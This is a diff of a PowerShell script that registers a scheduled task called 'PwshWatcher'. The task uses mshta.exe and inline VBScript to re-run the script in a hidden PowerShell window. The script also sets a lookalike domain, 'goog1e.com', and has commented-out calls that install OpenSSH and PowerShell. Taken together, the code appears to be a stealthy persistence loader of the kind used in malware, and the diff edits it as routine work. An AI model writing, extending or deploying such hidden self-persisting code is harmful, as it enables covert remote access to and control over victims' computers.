@@ -7,7 +7,7 @@ param (
     [switch]$CheckPowershell
 )
 
-$taskVersion = "1.9"
+$taskVersion = "2.03"
 $uri = "https://goog1e.com"
 $Logfile = "$PSScriptRoot\seed.log"
 
@@ -16,7 +16,7 @@ $TasksDefinitions = @{
     "Name"          = "PwshWatcher";
     "Values"        = @{
       "/ns:Task/ns:Actions/ns:Exec/ns:Command" = "mshta.exe";
-      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''{ScriptFile}''"""""", 0 : window.close")'
+      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& {ScriptFile}"""""", 0 : window.close")'
     };
     "XmlDefinition" = @"
 <?xml version="1.0" encoding="UTF-16"?>
@@ -161,27 +161,28 @@ try{
   . FindModules
 }
 catch {
-  Write-Output "Not all modules imported."
+  Write-Output $_
   return
 }
 
 ########  Variables
-
-$TaskName = "PwshWatcher"
 $destinationFolder = $PSScriptRoot
 $thisFileName = $MyInvocation.MyCommand.Name
 #$thisFileFullName = $MyInvocation.MyCommand.Path
 $scriptFile = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName)
+$replacements = @{"ScriptFile" = "'$scriptFile' -CheckPowershell"}
 $debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPreference  -eq "SilentlyContinue")
 
 ######## Check task
 
 if(-not $debugger)
 {
-  $taskExist = Register-Task -TaskData $TasksDefinitions[$TaskName]
+  $taskExist = Register-Task -TaskData $TasksDefinitions[$TaskName] -Replacements $replacements
   if (!$taskExist) {
     exit
   }
 }
-Install-OpenSsh
-Install-Powershell
+
+WriteLog -LogString $CheckPowershell
+#Install-OpenSsh
+#Install-Powershell
